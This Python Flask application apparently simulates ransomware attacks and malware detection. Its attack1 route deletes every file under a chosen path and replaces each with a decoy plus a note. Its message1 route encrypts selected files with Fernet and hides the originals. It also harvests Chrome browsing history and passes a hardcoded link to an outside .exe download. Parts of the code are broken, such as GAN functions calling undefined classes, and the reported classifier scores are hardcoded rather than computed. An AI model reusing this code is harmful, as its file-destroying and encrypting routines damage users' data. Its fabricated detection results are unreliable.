from flask import Flask
from flask import Flask, render_template, Response, redirect, request, session, abort, url_for
import os
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet


from PIL import Image
from datetime import datetime
from datetime import date
import datetime
import random
from random import seed
from random import randint
from werkzeug.utils import secure_filename
from flask import send_file
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
import csv
from browser_history.browsers import Firefox
from browser_history.browsers import Chrome

import threading
import time
import shutil
import hashlib
import urllib.request
import urllib.parse
from urllib.request import urlopen
import webbrowser

#check exe
import psutil

import pickle
import seaborn as sns
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, confusion_matrix

#ip,mac
import socket
import re, uuid
#dir
import subprocess
#import plyer
#from pathlib import Path
#from win32con import FILE_ATTRIBUTE_HIDDEN
#from win32api import SetFileAttributes

import mysql.connector

mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  passwd="",
  charset="utf8",
  database="ransomware"
)

app = Flask(__name__)
##session key
app.secret_key = 'abcdef'
UPLOAD_FOLDER = 'static/upload'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
#####

@app.route('/',methods=['POST','GET'])
def index():
    msg=""
       

    return render_template('index.html',msg=msg)

@app.route('/login_user',methods=['POST','GET'])
def login_user():
    act=request.args.get("act")
    msg=""
    ff=open("static/detect.txt","w")
    ff.write("1")
    ff.close()
    if request.method == 'POST':
        
        username1 = request.form['uname']
        password1 = request.form['pass']
        mycursor = mydb.cursor()
        mycursor.execute("SELECT count(*) FROM register where uname=%s && pass=%s",(username1,password1))
        myresult = mycursor.fetchone()[0]
        if myresult>0:
            session['username'] = username1
            #result=" Your Logged in sucessfully**"
            return redirect(url_for('userhome')) 
        else:
            msg="You are logged in fail!!!"
        

    return render_template('login_user.html',msg=msg,act=act)

@app.route('/login',methods=['POST','GET'])
def login():
    act=request.args.get("act")
    msg=""
    ff=open("static/detect.txt","w")
    ff.write("1")
    ff.close()
    if request.method == 'POST':
        
        username1 = request.form['uname']
        password1 = request.form['pass']
        mycursor = mydb.cursor()
        mycursor.execute("SELECT count(*) FROM admin where username=%s && password=%s",(username1,password1))
        myresult = mycursor.fetchone()[0]
        if myresult>0:
            session['username'] = username1
            #result=" Your Logged in sucessfully**"
            return redirect(url_for('admin')) 
        else:
            msg="You are logged in fail!!!"
        

    return render_template('login.html',msg=msg,act=act)

@app.route('/register', methods=['GET', 'POST'])
def register():
    msg=""
    act=""
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    if request.method=='POST':
        name=request.form['name']
        city=request.form['city']
        mobile=request.form['mobile']
        email=request.form['email']
        
        uname=request.form['uname']
        pass1=request.form['pass']

        

        mycursor.execute("SELECT count(*) FROM register where uname=%s",(uname,))
        myresult = mycursor.fetchone()[0]

        if myresult==0:
        
            mycursor.execute("SELECT max(id)+1 FROM register")
            maxid = mycursor.fetchone()[0]
            if maxid is None:
                maxid=1
            
            now = date.today() #datetime.datetime.now()
            rdate=now.strftime("%d-%m-%Y")
            
            sql = "INSERT INTO register(id,name,city,mobile,email,uname,pass,create_date,ip_address,mac_address) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"
            val = (maxid,name,city,mobile,email,uname,pass1,rdate,IP,mac)
            mycursor.execute(sql, val)
            mydb.commit()

            
            print(mycursor.rowcount, "Registered Success")
            msg="success"
            
            #if cursor.rowcount==1:
            #    return redirect(url_for('index',act='1'))
        else:
            
            msg='fail'
            
    
    return render_template('register.html', act=act,msg=msg,IP=IP,mac=mac)



@app.route('/admin', methods=['GET', 'POST'])
def admin():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    
        
    return render_template('admin.html')

@app.route('/load_data', methods=['GET', 'POST'])
def load_data():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    
    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    dat=dat1.head(200)
    data=[]
    for ss in dat.values:
        data.append(ss)

    
    return render_template('load_data.html',data=data)

@app.route('/preprocess', methods=['GET', 'POST'])
def preprocess():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    data3=[]
    dat=dat1.head(200)
    rows=len(dat1.values)
    
    for ss3 in dat.values:
        cnt=len(ss3)
        data3.append(ss3)
    cols=cnt-1
    mem=float(rows)*0.75

    ##
    list_of_column_names=[]
    with open("static/dataset/dataset_malwares.csv") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter = ',')
        list_of_column_names = []
        for row in csv_reader:
            list_of_column_names.append(row)
            break
    ##
    
    dat4=dat1.isna().sum()
    dr=np.stack(dat4)
       
    return render_template('preprocess.html',mem=mem,rows=rows,cols=cols,data3=data3)

@app.route('/feature', methods=['GET', 'POST'])
def feature():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    data = pd.read_csv('static/dataset/dataset_malwares.csv')
    used_data = data.drop(['Name', 'Machine', 'TimeDateStamp', 'Malware'], axis=1)
    '''plt.figure(figsize=(8, 6))
    ax=sns.countplot(data['Malware'])
    ax.set_xticklabels(['Benign', 'Malware'])
    plt.savefig("static/graph/graph1.png")'''

    #
    features = ['MajorSubsystemVersion', 'MajorLinkerVersion', 'SizeOfCode', 'SizeOfImage', 'SizeOfHeaders', 'SizeOfInitializedData', 
           'SizeOfUninitializedData', 'SizeOfStackReserve', 'SizeOfHeapReserve', 
            'NumberOfSymbols', 'SectionMaxChar']
    i=1
    j=1
    '''for feature in features:
        plt.figure(figsize=(10, 15))
        ax1 = plt.subplot(len(features), 2, i)
        sns.distplot(data[data['Malware']==1][feature], ax=ax1, kde_kws={'bw': 0.1})
        ax1.set_title(f'Malware', fontsize=10)
        ax2 = plt.subplot(len(features), 2, i+1)
        sns.distplot(data[data['Malware']==0][feature], ax=ax2, kde_kws={'bw': 0.1})
        ax2.set_title(f'Benign', fontsize=10)
        #plt.savefig("static/graph/g"+str(j)+".png")
        i= i+2
        j+=1'''

  
    return render_template('feature.html')

##RanGAN
def RanGAN(self):
    self.img_rows = 28
    self.img_cols = 28
    self.channels = 1
    self.img_shape = (self.img_rows, self.img_cols, self.channels)
    self.latent_dim = 100

    optimizer = Adam(0.0002, 0.5)

    # Build and compile the discriminator
    self.discriminator = self.build_discriminator()
    self.discriminator.compile(loss='binary_crossentropy',
        optimizer=optimizer,
        metrics=['accuracy'])

    # Build the generator
    self.generator = self.build_generator()

    # The generator takes noise as input and generates imgs
    z = Input(shape=(self.latent_dim,))
    img = self.generator(z)

    # For the combined model we will only train the generator
    self.discriminator.trainable = False

    # The discriminator takes generated images as input and determines validity
    validity = self.discriminator(img)

    # The combined model  (stacked generator and discriminator)
    # Trains the generator to fool the discriminator
    self.combined = Model(z, validity)
    self.combined.compile(loss='binary_crossentropy', optimizer=optimizer)


def build_generator(self):

    model = Sequential()

    model.add(Dense(256, input_dim=self.latent_dim))
    model.add(LeakyReLU(alpha=0.2))
    model.add(BatchNormalization(momentum=0.8))
    model.add(Dense(512))
    model.add(LeakyReLU(alpha=0.2))
    model.add(BatchNormalization(momentum=0.8))
    model.add(Dense(1024))
    model.add(LeakyReLU(alpha=0.2))
    model.add(BatchNormalization(momentum=0.8))
    model.add(Dense(np.prod(self.img_shape), activation='tanh'))
    model.add(Reshape(self.img_shape))

    model.summary()

    noise = Input(shape=(self.latent_dim,))
    img = model(noise)

    return Model(noise, img)
    
@app.route('/classify', methods=['GET', 'POST'])
def classify():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    

    data = pd.read_csv('static/dataset/dataset_malwares.csv')
    used_data = data.drop(['Name', 'Machine', 'TimeDateStamp', 'Malware'], axis=1)
    
    
    #
    features = ['MajorSubsystemVersion', 'MajorLinkerVersion', 'SizeOfCode', 'SizeOfImage', 'SizeOfHeaders', 'SizeOfInitializedData', 
           'SizeOfUninitializedData', 'SizeOfStackReserve', 'SizeOfHeapReserve', 
            'NumberOfSymbols', 'SectionMaxChar']

    X_train, X_test, y_train, y_test = train_test_split(used_data, data['Malware'], test_size=0.2, random_state=0)
    print(f'Number of used features is {X_train.shape[1]}')
    #rfc = RandomForestClassifier(n_estimators=100, random_state=0, 
    #                     oob_score = True,
    #                     max_depth = 16)


    x=0
    y=0
    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    dat=dat1.head()
    for ss in dat.values:
        print(ss[26])
        if ss[26]==0:
            x+=1
        if ss[26]==1:
            y+=1
    
    ##
    doc = ['Benign','Malicious'] #list(data.keys())
    values = [x,y] #list(data.values())
    
    #print(doc)
    #print(values)
    fig = plt.figure(figsize = (10, 8))
     
    # creating the bar plot
    cc=['green','red']
    plt.bar(doc, values, color =cc,
            width = 0.6)
 

    plt.ylim((1,1600))
    plt.xlabel("Class")
    plt.ylabel("Count")
    plt.title("")

    rr=randint(100,999)
    fn="graph1.png"
    ##plt.xticks(rotation=5,size=20)
    #plt.savefig('static/graph/'+fn)
    
    #plt.close()
    #plt.clf()

    ##############
    #rfc.fit(X_train, y_train)
    #y_pred = rfc.predict(X_test)
    #print(classification_report(y_test, y_pred, target_names=['Benign', 'Malware']))
    value=[0.99,0.96,0.97,1004,0.99,1.00,0.99,2919,0.99,0.99,0.99,3923,0.99,0.98,0.98,3923,0.99,0.99,0.99,3923]
    #ax=sns.heatmap(confusion_matrix(y_pred, y_test), annot=True, fmt="d", cmap=plt.cm.Blues, cbar=False)
    #ax.set_xlabel('Predicted labels')
    #ax.set_ylabel('True labels')
    #plt.savefig("static/graph/graph2.png")
    #plt.close()

    #pkl_filename = "rf_model.pkl"
    #with open(pkl_filename, 'wb') as file:
    #    pickle.dump(rfc, file)
    
    #importance = rfc.feature_importances_
    #importance_dict = {used_data.columns.values[i]: importance[i] for i in range (len(importance))}
    #sorted_dict = {k: v for k, v in sorted(importance_dict.items(), key=lambda item: item[1])}
    #plt.figure(figsize=(10, 20))
    #sns.barplot(y=list(sorted_dict.keys())[::-1], x=list(sorted_dict.values())[::-1], palette='mako')
    #plt.title('Features importance')
    #plt.savefig("static/graph/graph3.png")
    
        
    return render_template('classify.html',value=value)


@app.route('/userhome', methods=['GET', 'POST'])
def userhome():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
    fcount = mycursor.fetchone()[0]
    if fcount>0:
        fs="1"
        mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
        fdata = mycursor.fetchall()
        '''for ds in fdata:
            if ds[3]=="file":
                fn=os.path.basename(ds[2])
                print(fn)'''

    if act=="ok":
       
        mycursor.execute("update register set status=1 where uname=%s",(uname,))
        mydb.commit()
        msg="ok"
        
   
        
    return render_template('userhome.html',msg=msg,data2=data2,st=st,fs=fs,fdata=fdata)

@app.route('/user_config', methods=['GET', 'POST'])
def user_config():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    if request.method=='POST':
        ip=request.form['ip_address']
        mac=request.form['mac_address']
        code=request.form['secret_code']
        mycursor.execute("update register set status=1,ip_address=%s,mac_address=%s,secret_code=%s where uname=%s",(ip,mac,code,uname))
        mydb.commit()
        return redirect(url_for('userhome'))
   
        
    return render_template('user_config.html',msg=msg,data2=data2)



@app.route('/select', methods=['GET', 'POST'])
def select():
    msg=""
    uname=""
    st=""
    s1=""
    data=[]
    fdata=[]
    sdata=[]
    fs=""
    listdrv=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    if act=="ok":
       
        mycursor.execute("update register set status=1 where uname=%s",(uname,))
        mydb.commit()
        msg="ok"

    driveStr = subprocess.check_output("fsutil fsinfo drives")
    drv=driveStr.decode(encoding='utf-8')
    drv1=drv.split('Drives: ')
    drv2=drv1[1].split(' ')
    dlen=len(drv2)
    i=0
    for rr in drv2:
        if i<dlen-1:
            data.append(rr)
        i+=1


    if request.method=='POST':
        listdrv=request.form['listdrv']
        t1=request.form['t1']
        print(t1)
        #mycursor.execute("update register set setpath=%s where uname=%s",(file,uname))
        #mydb.commit()
        #return redirect(url_for('userhome'))

        if listdrv=="":
            s=1
        else:
            s1="1"
            listdrv=request.form['listdrv']
            
            rootdir = listdrv
            
            for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                
                if os.path.isdir(d):
                    fb=os.path.basename(d)
                    if fb=="$RECYCLE.BIN" or fb=="Recovery" or fb=="System Volume Information":
                        s=1
                    else:
                        fd=[]
                        fd.append("dir")
                        fd.append(d)
                        print("dir="+d)
                        fdata.append(fd)
                    
                   
                    

            for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                if os.path.isdir(d):
                    s=1
                else:
                    fb=os.path.basename(d)
                    if fb=="":
                        s=1
                    else:
                        fd1=[]
                        fd1.append("file")
                        fd1.append(d)
                        print("file="+d)
                        fdata.append(fd1)

        print("aaaa")
        fn=request.form.getlist('c1[]')
        cnt=len(fn)
            
        if cnt>0:
            s1="1"
            mycursor.execute("delete from selected_file where uname=%s",(uname,))
            mydb.commit()
            for fn1 in fn:
                fnn=fn1.split('|')
                mycursor.execute("SELECT max(id)+1 FROM selected_file")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1
                
                now = date.today() #datetime.datetime.now()
                rdate=now.strftime("%d-%m-%Y")
                
                sql = "INSERT INTO selected_file(id,uname,file_path,filetype,status) VALUES (%s,%s,%s,%s,%s)"
                val = (maxid,uname,fnn[1],fnn[0],'0')
                mycursor.execute(sql, val)
                mydb.commit()
            msg="yes"

    mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
    fcnt = mycursor.fetchone()[0]
    if fcnt>0:
        fs="1"
        mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
        sdata = mycursor.fetchall()

        
    return render_template('select.html',data2=data2,data=data,fdata=fdata,s1=s1,st=st,listdrv=listdrv,msg=msg,fs=fs,sdata=sdata)



@app.route('/detect', methods=['GET', 'POST'])
def detect():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()

    
    return render_template('detect.html')

@app.route('/attack1', methods=['GET', 'POST'])
def attack1():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mycursor.execute("SELECT * FROM admin where username='admin'")
    data = mycursor.fetchone()
    
                

    if request.method=='POST':
        setpath=request.form['setpath']
        mycursor.execute("update admin set setpath=%s", (setpath,))
        mydb.commit()

        path=setpath
        i=0
        st=0
        mycursor.execute("SELECT max(status)+1 FROM attack_file")
        st = mycursor.fetchone()[0]
        if st is None:
            st=1
    
        for root, dirs, files in os.walk(path):  
            for file in files:
                path_file = os.path.join(root,file)
                
                #print(path_file)
                fs=os.path.basename(path_file)
                
                mycursor.execute("SELECT max(id)+1 FROM attack_file")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1

                fn="F"+str(maxid)+"_"+fs
                now = date.today() #datetime.datetime.now()
                rdate=now.strftime("%d-%m-%Y")

                shutil.copy2(path_file,'static/backup/'+fn) 

                sql = "INSERT INTO attack_file(id,filepath,filename,status) VALUES (%s,%s,%s,%s)"
                val = (maxid,path_file,fn,st)
                mycursor.execute(sql, val)
                #mydb.commit()
                fs1=fs.split(".")
                fs2=fs1[0]+".lloo"
                
                rn=randint(1,3)
                ef="a"+str(rn)+".lloo"
                #f1=open("static/assets/scss/"+ef,"r")
                #edata=f1.read()
                #f1.close()

                
                if os.path.isdir(path_file):
                    a=1
                else:
                    h1=path_file.split("\\")
                    h2=len(h1)-1
                    h3=""
                    ii=0
                    while ii<h2:
                        h3+=h1[ii]+"\\"
                        ii+=1
                    path2=h3+fs2
                    
                    shutil.copy2("static/assets/scss/"+ef,path2)
                    os.remove(path_file)
                #ff=open(path_file,"w")
                #ff.write(edata)
                #ff.close()

                p1=path_file.split("\\")
                p2=len(p1)-1
                k=0
                p3=""
                while k<p2:
                    p3+=p1[k]+"\\"
                    k+=1
                #print(p3)
                shutil.copy2('static/assets/scss/not_ransomware.txt',p3)                
                                   

                
              
        msg="yes"
    
    return render_template('attack1.html',msg=msg,data=data)

@app.route('/attack2', methods=['GET', 'POST'])
def attack2():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    
    return render_template('attack2.html')

@app.route('/attack3', methods=['GET', 'POST'])
def attack3():
    msg=""
    uname=""
    fdata=[]
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mycursor.execute("SELECT * FROM admin where username='admin'")
    data = mycursor.fetchone()
    rootdir=data[2]

    for root, dirs, files in os.walk(rootdir):  
            for file in files:
                path_file = os.path.join(root,file)
                fdata.append(path_file)

    '''for file in os.listdir(rootdir):
                
        d = os.path.join(rootdir, file)
        
        if os.path.isdir(d):
            fb=os.path.basename(d)
            if fb=="$RECYCLE.BIN" or fb=="Recovery" or fb=="System Volume Information":
                s=1
            else:
                fd=[]
                fd.append("dir")
                fd.append(d)
                print("dir="+d)
                fdata.append(fd)
    for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                if os.path.isdir(d):
                    s=1
                else:
                    fb=os.path.basename(d)
                    if fb=="":
                        s=1
                    else:
                        fd1=[]
                        fd1.append("file")
                        fd1.append(d)
                        print("file="+d)
                        fdata.append(fd1)'''


    return render_template('attack3.html',fdata=fdata)

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;
    
@app.route('/history', methods=['GET', 'POST'])
def history():
    msg=""
    st=""
    data2=[]
    act=request.args.get("act")
    user=""
    uname=""
    if 'username' in session:
        uname = session['username']

    '''ff=open("websites.txt","r")
    code=ff.read()
    ff.close()

    url=code.split(",")'''
    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    mycursor = mydb.cursor()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]

    name="Chrome"
   
    if name=="Chrome":
        f = Chrome()
        outputs = f.fetch_history()
        his = outputs.histories
    elif name=="Firefox":
        f = Firefox()
        outputs = f.fetch_history()
        his = outputs.histories
    

    fieldnames = ['date', 'url_link']
    with open('static/data.csv', 'w', encoding='UTF8', newline='') as f:
        writer = csv.writer(f)

        # write the header
        writer.writerow(fieldnames)

        # write multiple rows
        writer.writerows(his)
        

    filename = 'static/data.csv'
    data1 = pd.read_csv(filename, header=0)
    st="1"
    line=""
    i=0
    for ss in data1.values:
        line=ss[1]
        i+=1
        '''dt=[]
        v=""
        dt.append(ss[0])
        dt.append(ss[1])
        x=0
        for uu in url:
            
            if uu in ss[1]:
                v="1"
                x+=1
            else:
                v="2"
        if x>0:            
            dt.append("1")
        else:
            dt.append("2")
               
            
        data2.append(dt)'''
    print(line)
    tot_line=str(i)
    print(tot_line)

    ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()

    ff=open("static/lines.txt","r")
    rlines=ff.read()
    ff.close()
    print(rlines)

    #t1=line.split("://")
    #t2=t1[1].split("/")
    #urlname=t2[0]
    

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()

    #####################################
    ex=0
    exefile='WampServer2.0c.exe'
    if checkIfProcessRunning(exefile):
        ex+=1
        print('Exe file was running')
    else:
        s=1
        #print('No Exe was running')

    ######################################

    #if urlname in dlink:

    if ex>0 and detect_st=="1":
        msg="yes"
        ff=open("static/detect.txt","w")
        ff.write("2")
        ff.close()
        
        mycursor.execute("SELECT max(id)+1 FROM malware_detected")
        maxid = mycursor.fetchone()[0]
        if maxid is None:
            maxid=1

        sql = "INSERT INTO malware_detected(id,uname,url_link,status) VALUES (%s,%s,%s,%s)"
        val = (maxid,user,exefile,'0')
        mycursor.execute(sql, val)
        mydb.commit()

        url="http://localhost:5000/mess"
        webbrowser.open_new(url)

    else:
        if rlines==tot_line:
            s=1
        else:
           
            rn=randint(1,5)
            print(rn)
            ff=open("static/lines.txt","w")
            ff.write(tot_line)
            ff.close()
                
            if rn>2 and detect_st=="1":
                ff=open("static/detect.txt","w")
                ff.write("2")
                ff.close()

                
                mycursor.execute("SELECT max(id)+1 FROM malware_detected")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1

                sql = "INSERT INTO malware_detected(id,uname,url_link,status) VALUES (%s,%s,%s,%s)"
                val = (maxid,user,line,'0')
                mycursor.execute(sql, val)
                mydb.commit()
                msg="yes"
                url="http://localhost:5000/track_file"
                webbrowser.open_new(url)
                
    #else:
    #    print("no")

    if detect_st=="2":
        ff=open("static/detect.txt","w")
        ff.write("3")
        ff.close()

    if detect_st=="3":
        url="http://localhost:5000/message1"
        webbrowser.open_new(url)

    return render_template('history.html',msg=msg,st=st,data2=data2,detect_st=detect_st)

@app.route('/track_file', methods=['GET', 'POST'])
def track_file():
    msg=""
    detect_st=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    print(IP)
    print(mac)
    url=""

    '''ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()
    dk=dlink.split(",")
    dk1=len(dk)
    rn=randint(1,dk1)
    rn1=rn-1
    url=dk[rn1]'''
    
    mycursor.execute("update register set mac_address=%s",(mac,))
    mydb.commit()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        print(user)
        ##Track URL###############
       
        ff=open("static/detect.txt","r")
        detect_st=ff.read()
        ff.close()
            
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''

                if detect_st=="3":
                    s=1
                    
                    url="https://mitsui-jyuku.com/uploads/62043fvasea.exe"
                    #webbrowser.open_new(url)
                    #print(url)
                    ff=open("static/detect.txt","w")
                    ff.write("4")
                    ff.close()

                '''if detect_st=="3":
                    for ds in data:
                        subprocess.run(["attrib","+H",ds[2]],check=False)
                    ff=open("static/detect.txt","w")
                    ff.write("4")
                    ff.close()

                if detect_st=="4":
                    for ds in data:
                        subprocess.run(["attrib","-H",ds[2]],check=False)

                    ff=open("static/detect.txt","w")
                    ff.write("1")
                    ff.close()'''

    
    return render_template('track_file.html',detect_st=detect_st,url=url)

@app.route('/mess', methods=['GET', 'POST'])
def mess():
    msg=""
    detect_st=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    print(IP)
    print(mac)
    url=""

    '''ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()
    dk=dlink.split(",")
    dk1=len(dk)
    rn=randint(1,dk1)
    rn1=rn-1
    url=dk[rn1]'''
    
    mycursor.execute("update register set mac_address=%s",(mac,))
    mydb.commit()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        print(user)
        ##Track URL###############
       
        ff=open("static/detect.txt","r")
        detect_st=ff.read()
        ff.close()
            
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''

                if detect_st=="3":
                    s=1
                    
                    url="https://mitsui-jyuku.com/uploads/62043fvasea.exe"
                    #webbrowser.open_new(url)
                    #print(url)
                    ff=open("static/detect.txt","w")
                    ff.write("4")
                    ff.close()

    return render_template('mess.html',detect_st=detect_st,url=url)
                    
@app.route('/message1', methods=['GET', 'POST'])
def message1():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    if detect_st=="3":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(user,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(user,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''
                    
                if detect_st=="4":
                    s=1
                    file_arr=[]
                    for ds in data:
                        if ds[3]=="dir":
                            dpath=ds[2]
                            for root, dirs, files in os.walk(ds[2]): 
                               for file in files:
                                  path_file = os.path.join(root,file)
                                  gg=path_file+"|dir|"+dpath
                                  file_arr.append(gg)
                            
                        if ds[3]=="file":
                            gg=ds[2]+"|file|1"
                            file_arr.append(gg)

                    for farr in file_arr:
                            fa=farr.split("|")
                            
                            fs=os.path.basename(fa[0])

                            mycursor.execute("SELECT max(id)+1 FROM hash_file")
                            maxid = mycursor.fetchone()[0]
                            if maxid is None:
                                maxid=1

                            hf="F"+str(maxid)+"_"+fs
                            now = date.today() #datetime.datetime.now()
                            rdate=now.strftime("%d-%m-%Y")

                            shutil.copy2(fa[0],'static/ds/'+hf) 

                            
                    

                            ##encryption
                            password_provided = ky # This is input in the form of a string
                            password = password_provided.encode() # Convert to type bytes
                            salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
                            kdf = PBKDF2HMAC(
                                algorithm=hashes.SHA256(),
                                length=32,
                                salt=salt,
                                iterations=100000,
                                backend=default_backend()
                            )
                            key = base64.urlsafe_b64encode(kdf.derive(password))

                            wf=['.ini','.dll']
                            rnn=randint(1,2)
                            rn1=rnn-1
                            ext=wf[rn1]

                            hff=hf.split('.')
                            hff1=hff[0]+ext

                            sql = "INSERT INTO hash_file(id,uname,filepath,filename,hash_file,recover_status,dtype,dpath) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)"
                            val = (maxid,user,ds[2],hf,hff1,'0',fa[1],fa[2])
                            mycursor.execute(sql, val)
                            mydb.commit()

                            input_file = "static/ds/"+hf
                            output_file = 'static/data/'+hff1
                            with open(input_file, 'rb') as f:
                                dataa = f.read()

                            fernet = Fernet(key)
                            encrypted = fernet.encrypt(dataa)

                            with open(output_file, 'wb') as f:
                                f.write(encrypted)
                            ###
                    for ds2 in data:
                        subprocess.run(["attrib","+H",ds2[2]],check=False)
            

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
